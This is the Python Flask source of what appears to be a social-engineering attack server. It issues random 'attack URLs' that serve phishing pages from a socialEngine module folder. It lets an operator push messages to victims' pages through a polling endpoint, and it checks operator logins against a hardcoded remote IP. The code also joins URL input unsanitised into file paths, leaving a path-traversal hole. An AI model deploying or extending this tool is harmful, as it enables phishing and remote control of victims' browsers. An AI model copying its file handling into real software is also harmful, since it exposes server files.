
import os
from flask import Flask,request , Response
from flask_cors import CORS
import requests
import hashlib
import random
import string
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import asyncio
import mimetypes
from urllib.parse import unquote


app = Flask(__name__)
CORS(app)

url_list = {}
remote: str = 'http://127.0.0.1:5555/'

class user_sessen():
    username: str = ''
    url: str = ''
    attack_type: str = ''
    message: str ='none'

def get_random() -> str:
    # 定义可用的字符集，包括26个英文字母（大小写）和数字
    characters = string.ascii_letters + string.digits
    # 生成一个10个字符长度的随机字符串
    random_string = ''.join(random.choice(characters) for _ in range(10))
    if random_string in url_list.keys():
        return get_random()
    else:
        return random_string

@app.route('/push/<attack_url>/<message>')
def get_message(attack_url,message):
    if attack_url in url_list.keys():
        url_list.get(attack_url).message = unquote(message)
        return 'ok'

    else:
        return 'your message error'


@app.route('/<attack_url>')
def attack_url(attack_url):
    if attack_url in url_list.keys():
        u: user_sessen = url_list.get(attack_url)
        r = Response()
        r.data = open('modules/socialEngine/'+u.attack_type+"/index.html").read()
        return r
    else:
        return 'your message error'

@app.route('/run/<attack_url>')
def xhr_run(attack_url):
    if attack_url in url_list.keys():
        u: user_sessen = url_list.get(attack_url)
        # 返回u.message的值
        message_to_return = u.message
        # 更新u.message为'none'
        u.message = 'none'
        # 返回之前存储的消息
        return message_to_return
    else:
        return 'none'
    
@app.route('/resource/<path:url>') 
def get_resource(url):

    full_url = 'resource/' + str(url)
    r = Response()
    r.data = open(full_url , 'rb').read()
    (content_type, encoding) = mimetypes.guess_type(full_url)
    r.headers['Content-Type'] = content_type
    
    return r


@app.route('/api/<attack_type>/<user>/<pwd>')
def attack(attack_type,user,pwd):
    md5_pwd = hashlib.md5(str(pwd).encode()).hexdigest()

    r = requests.get("http://154.9.253.147:8888/?Logon="+user+"?Passwd="+md5_pwd+"?Command=list database")
    if r.text != 'Passwd Or UserName Error!':
        n = get_random()
        
        u = user_sessen()
        u.url = n
        u.attack_type = attack_type
        u.username = user

        url_list[n] = u
        return n

    else:
        return 'your message error'

if __name__ == '__main__':
    app.run(port=5555)